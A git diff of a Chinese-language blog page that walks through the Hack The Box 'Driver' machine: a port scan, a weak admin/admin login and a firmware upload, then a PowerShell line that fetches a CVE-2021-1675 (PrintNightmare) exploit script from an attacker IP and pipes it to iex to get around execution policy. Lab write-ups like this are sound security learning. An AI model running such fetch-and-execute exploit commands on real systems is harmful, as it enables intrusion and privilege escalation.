@@ -16,12 +16,12 @@
   <meta name="author" content="FYHypo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 端口扫描  80web、135rpc、445smb、5985winrm(远程管理)    0x02 web弱密码admin&#x2F;admin登进后台，打印机固件更新中心   泄露了域信息：driver.htb，尝试host碰撞    暂时来看没什么收获   对唯一的功能点update测试：  “选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启">
+    <meta name="description" content="123title: [HTB] Driver index_img: &#x2F;img&#x2F;Billub0x.jpgtag: pentest HTB     0x01 端口扫描  80web、135rpc、445smb、5985winrm(远程管理)    0x02 web弱密码admin&#x2F;admin登进后台，打印机固件更新中心   泄露了域信息：driver.htb，尝试host碰撞    暂时来看">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FYHypo&#39;s blog">
 <meta property="og:url" content="https://fyhypo.github.io/2024/08/31/Driver/index.html">
 <meta property="og:site_name" content="FYHypo&#39;s blog">
-<meta property="og:description" content="0x01 端口扫描  80web、135rpc、445smb、5985winrm(远程管理)    0x02 web弱密码admin&#x2F;admin登进后台，打印机固件更新中心   泄露了域信息：driver.htb，尝试host碰撞    暂时来看没什么收获   对唯一的功能点update测试：  “选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启">
+<meta property="og:description" content="123title: [HTB] Driver index_img: &#x2F;img&#x2F;Billub0x.jpgtag: pentest HTB     0x01 端口扫描  80web、135rpc、445smb、5985winrm(远程管理)    0x02 web弱密码admin&#x2F;admin登进后台，打印机固件更新中心   泄露了域信息：driver.htb，尝试host碰撞    暂时来看">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122200.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122213.png">
@@ -51,7 +51,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240813000105.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240813000115.png">
 <meta property="article:published_time" content="2024-08-31T03:38:37.353Z">
-<meta property="article:modified_time" content="2024-08-31T03:38:37.353Z">
+<meta property="article:modified_time" content="2024-08-31T05:34:14.033Z">
 <meta property="article:author" content="FYHypo">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122200.png">
@@ -316,7 +316,11 @@
             
               <div class="markdown-body">
                 
-                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122200.png" srcset="/img/loading.gif" lazyload></p>
+                <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">title:</span> [HTB] Driver <br><span class="hljs-symbol">index_img:</span> <span class="hljs-keyword">/img/</span>Billub0x.jpg<br><span class="hljs-symbol">tag:</span> pentest HTB<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122200.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240812122213.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>80web、135rpc、445smb、5985winrm(远程管理)</p>
@@ -459,7 +463,6 @@
 <p>如果在尝试导入模块时，被执行策略阻止，如上图，则可以尝试使用curl+管道符解决：</p>
 </blockquote>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.6</span>/CVE<span class="hljs-literal">-2021-1675</span>.ps1 <span class="hljs-literal">-UseBasicParsing</span> | <span class="hljs-built_in">iex</span><br><span class="hljs-comment">#-UseBasicParsing将允许文件返回，即使 IE 引擎不可用</span><br></code></pre></td></tr></table></figure>
-
 
 
 
